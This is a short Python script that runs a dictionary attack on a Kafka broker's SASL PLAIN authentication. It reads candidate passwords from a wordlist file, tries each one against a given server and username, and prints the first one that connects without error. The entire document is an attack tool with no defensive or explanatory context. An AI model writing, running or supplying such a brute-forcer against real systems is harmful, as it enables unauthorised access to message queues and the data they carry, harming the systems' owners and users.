#! /usr/bin/python

import sys
from kafka import KafkaConsumer

with open(sys.argv[3], "r") as file:
    for line in file.readlines():
        try:
            con = KafkaConsumer(
                bootstrap_servers=sys.argv[1],
                security_protocol="SASL_PLAINTEXT",
                sasl_mechanism='PLAIN',
                sasl_plain_username=sys.argv[2],
                sasl_plain_password=line.strip()
            )
            print("Password Found: " + line)
            break
        except KeyboardInterrupt:
            break
        except Exception:
            print("Tried:" + line)
